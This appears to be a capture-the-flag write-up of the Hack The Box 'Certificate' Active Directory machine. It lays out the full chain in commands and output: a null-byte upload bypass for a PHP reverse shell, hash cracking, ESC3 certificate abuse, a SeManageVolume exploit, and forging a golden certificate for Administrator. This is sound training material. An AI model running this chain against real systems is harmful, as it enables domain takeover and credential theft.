# Certificate - HTB Labs Writeup

**Machine:** Certificate (Windows AD)

**Difficulty:** Hard

<img width="1211" height="230" alt="2025-12-17_15-00" src="https://github.com/user-attachments/assets/7b706da3-f6bb-4986-aa44-06b819349db6" />

## Background / Scope

-**Target IP:** `10.129.232.96`

-**Goal:** Obtain Administrator access on the machine in a lab environment

-**Machine Info:** Certificate is a hard Windows Active Directory machine that starts with an E-learning platform. The web application is vulnerable to Null-Byte Injection in its file upload feature, allowing a PHP reverse shell to be executed for initial access as xamppuser. Database credentials are retrieved, enabling lateral movement to the Sara.B user. Further enumeration uncovers a network capture file that leaks Lion.SK’s credentials. Using these, Active Directory Certificate Services (ADCS) is enumerated, and a vulnerable template is exploited to request certificates on behalf of other users. A certificate for the Ryan.K user is then obtained, whose SeManageVolumePrivilege is leveraged to gain a shell as NT AUTHORITY\NETWORK SERVICE. Finally, SeImpersonatePrivilege is used to escalate to NT AUTHORITY\SYSTEM, dump ntds.dit and registry hives, and extract the Administrator’s NTLM hash, ultimately allowing access as the Administrator


## Target Enumeration (nmap)

```python
nmap -sC -sV 10.129.232.96
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-17 14:50 EST
Nmap scan report for 10.129.232.96
Host is up (0.47s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.0.30)
|_http-title: Did not follow redirect to http://certificate.htb/
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.0.30
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-12-18 03:50:40Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certificate.htb
| Not valid before: 2024-11-04T03:14:54
|_Not valid after:  2025-11-04T03:14:54
|_ssl-date: 2025-12-18T03:52:12+00:00; +8h00m02s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-12-18T03:52:11+00:00; +8h00m01s from scanner time.
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certificate.htb
| Not valid before: 2024-11-04T03:14:54
|_Not valid after:  2025-11-04T03:14:54
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certificate.htb
| Not valid before: 2024-11-04T03:14:54
|_Not valid after:  2025-11-04T03:14:54
|_ssl-date: 2025-12-18T03:52:12+00:00; +8h00m02s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certificate.htb
| Not valid before: 2024-11-04T03:14:54
|_Not valid after:  2025-11-04T03:14:54
|_ssl-date: 2025-12-18T03:52:11+00:00; +8h00m02s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Hosts: certificate.htb, DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 8h00m01s, deviation: 0s, median: 8h00m01s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-12-18T03:51:29
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 132.71 seconds
```

Common Active Directory services are running on this machine.I need to add domain name to `/etc/hosts`

```text
10.129.232.96       certificate.htb   dc01.certificate.htb
```


I'll open up HTTP on port 80

<img width="1279" height="650" alt="1" src="https://github.com/user-attachments/assets/65e3ed9b-9f28-44ac-93a3-c59bcc2179bc" />

## Upload Vulnerability

On `/course-details.php` we can upload files

<img width="1198" height="540" alt="3" src="https://github.com/user-attachments/assets/aa7736e3-eae4-4d7a-93b8-e9237b0753bc" />


I tried simple PHP reverse shell file but It didn't work because of extensions.It this way I'll use `Null Byte Injection`.I'll just rename my `shell.php` to `shell.php..pdf` and put it to my zip file.Now we can upload this and intercept to perform `Null Byte Injection`


<img width="940" height="605" alt="41" src="https://github.com/user-attachments/assets/ed395160-9b09-46cf-a90c-76ecaa1702eb" />


We see `2e` is our hex-byte of `.`.We can modify this hex-byte to `00` and upload our file


<img width="941" height="586" alt="5" src="https://github.com/user-attachments/assets/cc9c7bcd-7478-4f16-8e14-933fb40f1279" />


As you can see, we have successfully uploaded our file.I'll run netcat and go to the uploaded path.We got shell!


```python
rlwrap nc -lvnp 9001        
listening on [any] 9001 ...
connect to [10.10.16.149] from (UNKNOWN) [10.129.232.96] 63837
SOCKET: Shell has connected! PID: 3152
Microsoft Windows [Version 10.0.17763.6532]
(c) 2018 Microsoft Corporation. All rights reserved.
C:\xampp\htdocs\certificate.htb\static\uploads\8ad6b1453a685cd6a6299
```



## Shell as `Sara.B`


In root directory I found these files

```text
C:\xampp\htdocs\certificate.htb>dir
 Volume in drive C has no label.
 Volume Serial Number is 7E12-22F9

 Directory of C:\xampp\htdocs\certificate.htb

12/30/2024  02:04 PM    <DIR>          .
12/30/2024  02:04 PM    <DIR>          ..
12/24/2024  12:45 AM             7,179 about.php
12/30/2024  01:50 PM            17,197 blog.php
12/30/2024  02:02 PM             6,560 contacts.php
12/24/2024  06:10 AM            15,381 course-details.php
12/24/2024  12:53 AM             4,632 courses.php
12/23/2024  04:46 AM               549 db.php
12/22/2024  10:07 AM             1,647 feature-area-2.php
12/22/2024  10:22 AM             1,331 feature-area.php
12/22/2024  10:16 AM             2,955 footer.php
12/23/2024  05:13 AM             2,351 header.php
12/24/2024  12:52 AM             9,497 index.php
12/25/2024  01:34 PM             5,908 login.php
12/23/2024  05:14 AM               153 logout.php
12/24/2024  01:27 AM             5,321 popular-courses-area.php
12/25/2024  01:27 PM             8,240 register.php
12/26/2024  01:49 AM    <DIR>          static
12/28/2024  11:26 PM            10,366 upload.php
              16 File(s)         99,267 bytes
               3 Dir(s)   4,386,459,648 bytes free

```

I read `db.php` and found `mysql` creds:

```python
C:\xampp\htdocs\certificate.htb>type db.php
<?php
// Database connection using PDO
try {
    $dsn = 'mysql:host=localhost;dbname=Certificate_WEBAPP_DB;charset=utf8mb4';
    $db_user = 'certificate_webapp_user'; // Change to your DB username
    $db_passwd = 'cert!f!c@teDBPWD'; // Change to your DB password
    $options = [
        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
        PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
    ];
    $pdo = new PDO($dsn, $db_user, $db_passwd, $options);
} catch (PDOException $e) {
    die('Database connection failed: ' . $e->getMessage());
}
?>
```

Now I connect to `Mysql` using these credentials to see are these valid

```python
PS C:\xampp\mysql\bin> .\mysql.exe -u 'certificate_webapp_user' -p'cert!f!c@teDBPWD' -e 'show databases;'
Database
certificate_webapp_db
information_schema
test
```

Let's check what databases are here

```python
PS C:\xampp\mysql\bin> .\mysql.exe -u "certificate_webapp_user" -p"cert!f!c@teDBPWD" -e "show databases;"
Database
certificate_webapp_db
information_schema
test
```

I'll checked the tables of `certificate_webapp_db` database

```python
PS C:\xampp\mysql\bin> .\mysql.exe -u "certificate_webapp_user" -p"cert!f!c@teDBPWD" -D "certificate_webapp_db" -e "show tables;"
Tables_in_certificate_webapp_db
course_sessions
courses
users
users_courses
PS C:\xampp\mysql\bin> .\mysql.exe -u "certificate_webapp_user" -p"cert!f!c@teDBPWD" -D "certificate_webapp_db" -e "describe users;"
Field   Type    Null    Key     Default Extra
id      int(11) NO      PRI     NULL    auto_increment
first_name      varchar(50)     NO              NULL
last_name       varchar(50)     NO              NULL
username        varchar(50)     NO      UNI     NULL
email   varchar(50)     NO      UNI     NULL
password        varchar(255)    NO              NULL
created_at      timestamp       YES             current_timestamp()
role    enum('student','teacher','admin')       YES             NULL
is_active       tinyint(1)      NO              1
```


I found usernames and encrypted passwords

```python
PS C:\xampp\mysql\bin> .\mysql.exe -u "certificate_webapp_user" -p"cert!f!c@teDBPWD" -D "certificate_webapp_db" -e "select username, password from users;"
username        password
Lorra.AAA       $2y$04$bZs2FUjVRiFswY84CUR8ve02ymuiy0QD23XOKFuT6IM2sBbgQvEFG
Sara1200        $2y$04$pgTOAkSnYMQoILmL6MRXLOOfFlZUPR4lAD2kvWZj.i/dyvXNSqCkK
Johney  $2y$04$VaUEcSd6p5NnpgwnHyh8zey13zo/hL7jfQd9U.PGyEW3yqBf.IxRq
havokww $2y$04$XSXoFSfcMoS5Zp8ojTeUSOj6ENEun6oWM93mvRQgvaBufba5I5nti
stev    $2y$04$6FHP.7xTHRGYRI9kRIo7deUHz0LX.vx2ixwv0cOW6TDtRGgOhRFX2
sara.b  $2y$04$CgDe/Thzw/Em/M4SkmXNbu0YdFo6uUs3nB.pzQPV.g8UdXikZNdH6
test    $2y$04$PA3te8crBqpKemIt4f.ZZ.WzdQvU7p1fwo1pIzq2wcAyN6Rh5LHMq
```

I decrypted hash using `John-the-Ripper` and got the password for `Sara.B` users

```python
john --wordlist=/usr/share/wordlists/rockyou.txt hashes  
Using default input encoding: UTF-8
Loaded 7 password hashes with 7 different salts (bcrypt [Blowfish 32/64 X2])
Cost 1 (iteration count) is 16 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Blink182         (sara.b)         
2g 0:01:08:20 37.02% (ETA: 19:34:05) 0.000487g/s 1328p/s 6685c/s 6685C/s mmk014..mmjssb17
Use the "--show" option to display all of the cracked passwords reliably
Session aborted
```


Let's check our creds

```python
crackmapexec smb 10.129.232.96 -u sara.b -p Blink182         
SMB         10.129.232.96   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certificate.htb) (signing:True) (SMBv1:False)
SMB         10.129.232.96   445    DC01             [+] certificate.htb\sara.b:Blink182 
                                                                    
 crackmapexec winrm 10.129.232.96 -u sara.b -p Blink182
SMB         10.129.232.96   5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:certificate.htb)
HTTP        10.129.232.96   5985   DC01             [*] http://10.129.232.96:5985/wsman
WINRM       10.129.232.96   5985   DC01             [+] certificate.htb\sara.b:Blink182 (Pwn3d!)

```

Our credentials are valid

```python
 evil-winrm -i 10.129.232.96 -u sara.b -p Blink182   
                                        
Evil-WinRM shell v3.7       
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                   
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Sara.B\Documents>
```

## Shell as `Lion.SK`

At the root-path of our user I found

```python
*Evil-WinRM* PS C:\Users\Sara.B\Documents\WS-01> dir


    Directory: C:\Users\Sara.B\Documents\WS-01


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        11/4/2024  12:44 AM            530 Description.txt
-a----        11/4/2024  12:45 AM         296660 WS-01_PktMon.pcap

```


There is description

```text
*Evil-WinRM* PS C:\Users\Sara.B\Documents\WS-01> type Description.txt
The workstation 01 is not able to open the "Reports" smb shared folder which is hosted on DC01.
When a user tries to input bad credentials, it returns bad credentials error.
But when a user provides valid credentials the file explorer freezes and then crashes!
```

I downloaded file `WS-01_PktMon.pcap` to open this on `Wireshark`


<img width="1270" height="724" alt="6" src="https://github.com/user-attachments/assets/661438f0-ac3d-48b6-9248-d79c9abbb99e" />


There is [tool](https://github.com/jalvarezz13/Krb5RoastParser) where I can extract hash from this file

```python
python3 krb5_roast_parser.py ../WS-01_PktMon.pcap as_req
$krb5pa$18$Lion.SK$CERTIFICATE.HTB$23f5159fa1c66ed7b0e561543eba6c010cd31f7e4a4377c2925cf306b98ed1e4f3951a50bc083c9bc0f16f0f586181c9d4ceda3fb5e852f0
```

I cracked this hash using `hashcat`

```python
hashcat hash.txt /usr/share/wordlists/rockyou.txt             
hashcat (v7.1.2) starting in autodetect mode

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5pa$18$Lion.SK$CERTIFICATE.HTB$23f5159fa1c66ed7b0e561543eba6c010cd31f7e4a4377c2925cf306b98ed1e4f3951a50bc083c9bc0f16f0f586181c9d4ceda3fb5e852f0:!QAZ2wsx
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 19900 (Kerberos 5, etype 18, Pre-Auth)
Hash.Target......: $krb5pa$18$Lion.SK$CERTIFICATE.HTB$23f5159fa1c66ed7...e852f0
Time.Started.....: Wed Dec 17 16:15:21 2025 (15 secs)
Time.Estimated...: Wed Dec 17 16:15:36 2025 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:      886 H/s (12.42ms) @ Accel:24 Loops:512 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 13920/14344385 (0.10%)
Rejected.........: 0/13920 (0.00%)
Restore.Point....: 13824/14344385 (0.10%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:3584-4095
Candidate.Engine.: Device Generator
Candidates.#01...: goodman -> mossimo

Started: Wed Dec 17 16:15:01 2025
Stopped: Wed Dec 17 16:15:37 2025
```

Now we got cracked password for user `Lion.SK`.Let's check our creds

```python
crackmapexec smb dc01.certificate.htb -u Lion.SK -p '!QAZ2wsx'
SMB         certificate.htb 445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certificate.htb) (signing:True) (SMBv1:False)
SMB         certificate.htb 445    DC01             [+] certificate.htb\Lion.SK:!QAZ2wsx 
                                                                    

 crackmapexec winrm dc01.certificate.htb -u Lion.SK -p '!QAZ2wsx'
SMB         certificate.htb 5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:certificate.htb)
HTTP        certificate.htb 5985   DC01             [*] http://certificate.htb:5985/wsman
WINRM       certificate.htb 5985   DC01             [+] certificate.htb\Lion.SK:!QAZ2wsx (Pwn3d!)
```



We got shell
```text
evil-winrm -i dc01.certificate.htb -u Lion.SK -p '!QAZ2wsx'
                                        
Evil-WinRM shell v3.7                  
                             
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Lion.SK\Documents>
```

Obtained `user.txt`

```text
*Evil-WinRM* PS C:\Users\Lion.SK\Desktop> type user.txt
957beb3b7fbbf5f61***************
```

## Shell as `Ryan.K`

### BloodHound

I run `bloodhound-python` to get `.zip` file for uploading on `BloodHound GUI`

```python
bloodhound-python -u 'Lion.SK' -p '!QAZ2wsx' -d certificate.htb -ns 10.129.232.96 -c All --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: certificate.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.certificate.htb
INFO: Testing resolved hostname connectivity dead:beef::b2a9:7ccc:3d41:c15e
INFO: Trying LDAP connection to dead:beef::b2a9:7ccc:3d41:c15e
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 3 computers
INFO: Connecting to LDAP server: dc01.certificate.htb
INFO: Testing resolved hostname connectivity dead:beef::b2a9:7ccc:3d41:c15e
INFO: Trying LDAP connection to dead:beef::b2a9:7ccc:3d41:c15e
INFO: Found 19 users
INFO: Found 58 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Done in 01M 40S
INFO: Compressing output into 20251217170838_bloodhound.zip
```


Before starting BloodHound GUI don't forget run `neo4j console` command



<img width="957" height="495" alt="bloodhound" src="https://github.com/user-attachments/assets/8e03aafd-aef9-4987-b2ab-1887dc7bdd69" />



As you can see, our user is member of `Domain CRA Manager`.To get more information I run `certipy` for finding template vulnerability


```python

└─# certipy find -u Lion.SK -p '!QAZ2wsx' -target certificate.htb -ns 10.129.232.96 -vulnerable -stdout
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 35 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Trying to get CA configuration for 'Certificate-LTD-CA' via CSRA
[!] Got error while trying to get CA configuration for 'Certificate-LTD-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'Certificate-LTD-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'Certificate-LTD-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : Certificate-LTD-CA
    DNS Name                            : DC01.certificate.htb
    Certificate Subject                 : CN=Certificate-LTD-CA, DC=certificate, DC=htb
    Certificate Serial Number           : 75B2F4BBF31F108945147B466131BDCA
    Certificate Validity Start          : 2024-11-03 22:55:09+00:00
    Certificate Validity End            : 2034-11-03 23:05:09+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : CERTIFICATE.HTB\Administrators
      Access Rights
        ManageCertificates              : CERTIFICATE.HTB\Administrators
                                          CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
        ManageCa                        : CERTIFICATE.HTB\Administrators
                                          CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
        Enroll                          : CERTIFICATE.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : Delegated-CRA
    Display Name                        : Delegated-CRA
    Certificate Authorities             : Certificate-LTD-CA
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : True
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectRequireDirectoryPath
                                          SubjectRequireEmail
                                          SubjectAltRequireEmail
                                          SubjectAltRequireUpn
    Enrollment Flag                     : AutoEnrollment
                                          PublishToDs
                                          IncludeSymmetricAlgorithms
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Certificate Request Agent
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : CERTIFICATE.HTB\Domain CRA Managers
                                          CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : CERTIFICATE.HTB\Administrator
        Write Owner Principals          : CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
                                          CERTIFICATE.HTB\Administrator
        Write Dacl Principals           : CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
                                          CERTIFICATE.HTB\Administrator
        Write Property Principals       : CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
                                          CERTIFICATE.HTB\Administrator
    [!] Vulnerabilities
      ESC3                              : 'CERTIFICATE.HTB\\Domain CRA Managers' can enroll and template has Certificate Request Agent EKU set
```


### ESC3 Vulnerability

[This misconfiguration](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation) allowed the attacker to request certificates on behalf of other users, including higher-privileged accounts. By abusing this functionality, it became possible to request a certificate for a privileged user and then authenticate as that user using certificate-based authentication.

First, I need to request certificate for user `Lion.SK`.
```python
certipy req -u 'lion.sk@CERTIFICATE.HTB' -p "\!QAZ2wsx" -dc-ip '10.129.232.96' -target 'DC01.CERTIFICATE.HTB' -ca 'Certificate-LTD-CA' -template 'Delegated-CRA'
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 36
[*] Got certificate with UPN 'Lion.SK@certificate.htb'
[*] Certificate object SID is 'S-1-5-21-515537669-4223687196-3249690583-1115'
[*] Saved certificate and private key to 'lion.sk.pfx'
```

Unfortunately, we can't request because email not available


```python
certipy req -u 'lion.sk@CERTIFICATE.HTB' -p "\!QAZ2wsx" -dc-ip '10.129.232.96' -target 'DC01.CERTIFICATE.HTB' -ca 'Certificate-LTD-CA' -template 'SignedUser' -pfx 'lion.sk.pfx' -on-behalf-of 'CERTIFICATE\administrator'
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094812 - CERTSRV_E_SUBJECT_EMAIL_REQUIRED - The email name is unavailable and cannot be added to the Subject or Subject Alternate name.
[*] Request ID is 39
Would you like to save the private key? (y/N) y
[*] Saved private key to 39.key
[-] Failed to request certificate

```

As you can see, Administrator has no email, I need to find the user who has more privileges to get Administrator access

```python
*Evil-WinRM* PS C:\Users\Ryan.K\Documents> get-aduser -filter * -properties * | select SamAccountName, mail

SamAccountName mail
-------------- ----
Administrator
Guest
krbtgt
Kai.X          kai.x@certificate.htb
Sara.B         sara.b@certificate.htb
John.C         john.c@certificate.htb
Aya.W          aya.w@certificate.htb
Nya.S          nya.s@certificate.htb
Maya.K         maya.k@certificate.htb
Lion.SK        lion.sk@certificate.htb
Eva.F          eva.f@certificate.htb
Ryan.K         ryan.k@certificate.htb
akeder.kh
kara.m
Alex.D         alex.d@certificate.htb
karol.s
saad.m         saad.m@certificate.htb
xamppuser

```


I checked `BloodHound` and found interesting user `Ryan.K`



<img width="1109" height="589" alt="7" src="https://github.com/user-attachments/assets/8706978f-f7ca-4483-bd8b-b4002502bf4e" />


`Ryan.K` is the member of `Domain Storage Manage`, which maybe can gives us `Write/Full Control` right to system files


I successfully requested `Ryan.K` certificate 

```python
certipy req -u 'lion.sk@CERTIFICATE.HTB' -p "\!QAZ2wsx" -dc-ip '10.129.232.96' -target 'DC01.CERTIFICATE.HTB' -ca 'Certificate-LTD-CA' -template 'SignedUser' -pfx 'lion.sk.pfx' -on-behalf-of 'CERTIFICATE\ryan.k'
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 37
[*] Got certificate with UPN 'ryan.k@certificate.htb'
[*] Certificate object SID is 'S-1-5-21-515537669-4223687196-3249690583-1117'
[*] Saved certificate and private key to 'ryan.k.pfx'
```

Now I can request the user `TGT`
```python
certipy auth -pfx ryan.k.pfx -dc-ip '10.129.232.96' 
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: ryan.k@certificate.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'ryan.k.ccache'
[*] Trying to retrieve NT hash for 'ryan.k'
[*] Got hash for 'ryan.k@certificate.htb': aad3b435b51404eeaad3b435b51404ee:b1bc3d70e70f4f36b1509a65ae1a2ae6
```


We got shell as `Ryan.K`

```python
evil-winrm -i 10.129.232.96 -u ryan.k -H b1bc3d70e70f4f36b1509a65ae1a2ae6  
                                        
Evil-WinRM shell v3.7
                                                                                
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Ryan.K\Documents>
```


## Privilege Escalation


First, I checked what privilege our user has

```python
*Evil-WinRM* PS C:\Users\Ryan.K\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                      State
============================= ================================ =======
SeMachineAccountPrivilege     Add workstations to domain       Enabled
SeChangeNotifyPrivilege       Bypass traverse checking         Enabled
SeManageVolumePrivilege       Perform volume maintenance tasks Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set   Enabled
```

`SeManageVolumePrivilege` looks interesting here.I found [exploit](https://github.com/CsEnox/SeManageVolumeExploit) which grant us full permissions on `C:\` drive

```python
*Evil-WinRM* PS C:\Users\Ryan.K\Documents> .\SeManageVolumeExploit.exe
Entries changed: 858

DONE
```

But I can't get `root.txt` file

```python
*Evil-WinRM* PS C:\Users\Ryan.K\Documents> type C:\Users\Administrator\Desktop\root.txt
Access is denied
At line:1 char:1
+ type C:\Users\Administrator\Desktop\root.txt
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\Users\Administrator\Desktop\root.txt:String) [Get-Content], UnauthorizedAccessException
    + FullyQualifiedErrorId : ItemExistsUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
```


This file is encrypted


```python
cipher /c root.txt

 Listing C:\users\administrator\desktop\
 New files added to this directory will be encrypted.

E root.txt
  Compatibility Level:
    Windows Vista/Server 2008

cipher.exe : Access is denied.
    + CategoryInfo          : NotSpecified: (Access is denied.:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
Access is denied.  Key information cannot be retrieved.

Access is denied
```

It's too complicated to decrypt this file, so I'll try different way to PrivEsc



### Golden Certificate


First, I need `serial number` of `Certificate-LTD-CA`, then I need to get certification

```python

*Evil-WinRM* PS C:\Users\Ryan.K\Documents> certutil -exportPFX 75b2f4bbf31f108945147b466131bdca .\ca.pfx
MY "Personal"
================ Certificate 3 ================
Serial Number: 75b2f4bbf31f108945147b466131bdca
Issuer: CN=Certificate-LTD-CA, DC=certificate, DC=htb
 NotBefore: 11/3/2024 2:55 PM
 NotAfter: 11/3/2034 3:05 PM
Subject: CN=Certificate-LTD-CA, DC=certificate, DC=htb
Certificate Template Name (Certificate Type): CA
CA Version: V0.0
Signature matches Public Key
Root Certificate: Subject matches Issuer
Template: CA, Root Certification Authority
Cert Hash(sha1): 2f02901dcff083ed3dbb6cb0a15bbfee6002b1a8
  Key Container = Certificate-LTD-CA
  Unique container name: 26b68cbdfcd6f5e467996e3f3810f3ca_7989b711-2e3f-4107-9aae-fb8df2e3b958
  Provider = Microsoft Software Key Storage Provider
Signature test passed
Enter new password for output file .\ca.pfx:
Enter new password:
Confirm new password:
CertUtil: -exportPFX command completed successfully.
```

I downloaded this `ca.pfx` and forgering `administrator certification`

```python
certipy forge -ca-pfx ca.pfx -upn Administrator@certificate.htb -subject 'CN=ADMINISTRATOR,CN=USERS,DC=CERTIFICATE,DC=HTB'
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Saved forged certificate and private key to 'administrator_forged.pfx'
```

Now I got administrator certification and now we can request TGT 

```python
certipy auth -pfx administrator_forged.pfx -dc-ip 10.129.232.96
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@certificate.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@certificate.htb': aad3b435b51404eeaad3b435b51404ee:d804304519bf0143c14cbf1c024408c6
```


## Shell as `Administrator`

```python

evil-winrm -i 10.129.232.96 -u Administrator -H d804304519bf0143c14cbf1c024408c6
                                        
Evil-WinRM shell v3.7
                                                       
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                           
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>

```

Obtained `root.txt`

```python

*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
01c25bad0ee1bb6b2***************
```



# Conclusion

This box highlighted the severe impact of AD CS misconfigurations combined with excessive domain privileges. Membership in the Domain Storage Managers group provided backup rights that allowed extraction of the CA private key, leading to a successful Golden Certificate attack. With control over the CA, arbitrary user certificates could be forged, enabling credential-less authentication and decryption of EFS-protected files. This demonstrates that compromising a Certification Authority results in complete and persistent domain compromise.













